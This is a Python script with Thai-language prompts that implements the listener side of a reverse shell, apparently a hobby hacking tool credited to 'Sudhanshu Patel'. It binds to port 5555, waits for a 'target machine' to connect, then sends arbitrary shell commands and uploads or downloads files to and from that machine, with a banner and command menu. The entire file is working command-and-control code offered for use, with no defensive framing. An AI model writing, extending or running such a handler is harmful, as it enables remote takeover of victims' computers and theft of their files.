from colorama import Fore, Back
import time
import sys
import os
from subprocess import call
import socket
import json

print(Fore.YELLOW + '''
      _______      __    ________  ___  ___        _______   _______      __    ________  ___  ___  
 /"     "|    /""\  ("      "\|"  \/"  |      |   __ "\ /"     "|    /""\  ("      "\|"  \/"  | 
(: ______)   /    \  \___/   :)\   \  /       (. |__) :|: ______)   /    \  \___/   :)\   \  /  
 \/    |    /' /\  \   /  ___/  \\  \/        |:  ____/ \/    |    /' /\  \   /  ___/  \\  \/   
 // ___)_  //  __'  \ //  \__   /   /         (|  /     // ___)_  //  __'  \ //  \__   /   /    
(:      "|/   /  \\  (:   / "\ /   /         /|__/ \   (:      "|/   /  \\  (:   / "\ /   /     
 \_______|___/    \___)_______)___/         (_______)   \_______|___/    \___)_______)___/      
                                                                                                  
                                                                                    - Sudhanshu Patel    ''')

print()
print('ลิขสิทธิ์ (c) 2021 Sudhanshu Patel ภายใต้ใบอนุญาต MIT')
print()
ip = input(Fore.YELLOW + "=>กรุณากรอกที่อยู่ IP ของคุณ#~ ")
print(Fore.GREEN + "[+] กำลังทำงาน...:")
animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]

def write_ip(ip):
    if not os.path.exists("ip_file.txt"):  # เช็คว่าไฟล์ยังไม่มี
        f = open("ip_file.txt", "w")
        f.write(f"{ip}")
        f.close()
    else:
        print("ไฟล์ ip_file.txt มีอยู่แล้ว")

for i in range(len(animation)):
    time.sleep(0.2)
    sys.stdout.write("\r" + animation[i % len(animation)])
    sys.stdout.flush()

write_ip(ip)
print("\n")

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()

def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)
        if command == 'exit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:6] == 'upload':
            upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ip, 5555))
print(Fore.YELLOW + '[*] คำสั่งที่ใช้งานได้ -')
print(Fore.YELLOW +'		*cd [path] ~ เพื่อเปลี่ยนไดเร็กทอรี')
print(Fore.YELLOW +'		*dir ~ เพื่อแสดงรายการไฟล์ในไดเร็กทอรีปัจจุบัน')
print(Fore.YELLOW +'		*download [ชื่อไฟล์] ~ เพื่อดาวน์โหลดไฟล์จากเครื่องเป้าหมาย')
print(Fore.YELLOW +'		*upload [ชื่อไฟล์] ~ เพื่ออัพโหลดไฟล์ไปยังเครื่องเป้าหมาย')
print(Fore.YELLOW +'		*clear ~ เพื่อเคลียร์หน้าจอเทอร์มินัล')
print(Fore.YELLOW +'		*exit ~ เพื่อออกจากโปรแกรม')
print('')
print('[+] รอการเชื่อมต่อจากเครื่องเป้าหมาย#')
sock.listen(5)
target, ip = sock.accept()

print('[+] เชื่อมต่อกับเครื่องเป้าหมายจาก#~ ' + str(ip))
# ตัวเลือกที่สามารถใช้งานได้
target_communication()



